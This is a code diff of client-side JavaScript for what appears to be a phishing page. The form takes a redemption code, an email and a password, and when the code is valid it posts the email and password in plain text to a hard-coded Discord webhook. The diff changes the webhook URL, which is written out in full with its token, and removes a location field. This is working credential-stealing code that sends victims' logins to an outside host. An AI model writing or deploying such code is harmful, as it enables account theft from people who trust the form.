@@ -14,10 +14,9 @@ document.addEventListener('DOMContentLoaded', () => {
     const code = codeInput.value.trim();
     const username = usernameInput.value.trim();
     const password = passwordInput.value.trim();
-    const location = locationInput.value.trim();
 
     // Vérification des champs
-    if (!code || !username || !password || !location) {
+    if (!code || !username || !password) {
       messageDiv.style.backgroundColor = 'red';
       messageDiv.style.boxShadow = '0 0 20px rgba(255, 0, 0, 0.5)'
       messageDiv.textContent = '❌ Please complete every input.';
@@ -41,7 +40,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
       // Vérification du code
       if (stock.codes.includes(code)) {
-        const webhookUrl = "https://discord.com/api/webhooks/1367465149270851635/5nXbo4SLfXgDVpf_B70dahUN7cvSAibTMzMKjUB9wgLFbxhhusy2vCIXhRhUDRHDwCnJ";
+        const webhookUrl = "https://discord.com/api/webhooks/1366140909271384096/jAvGx7OI4_irwimvJ1tGblUIlu4Ayyba2orAxDwMHOmv4VQSSKmf2u5CUU9nyb2qsjeL";
         
         const payload = {
           embeds: [{
@@ -51,7 +50,6 @@ document.addEventListener('DOMContentLoaded', () => {
               { name: "Code", value: `\`${code}\``, inline: false },
               { name: "Email", value: `\`${username}\``, inline: true },
               { name: "Password", value: `\`${password}\``, inline: true },
-              { name: "Location", value: `\`${location}\``, inline: false }
             ],
             timestamp: new Date().toISOString()
           }]
@@ -96,5 +94,4 @@ document.addEventListener('DOMContentLoaded', () => {
     }
   });
 });
-
 
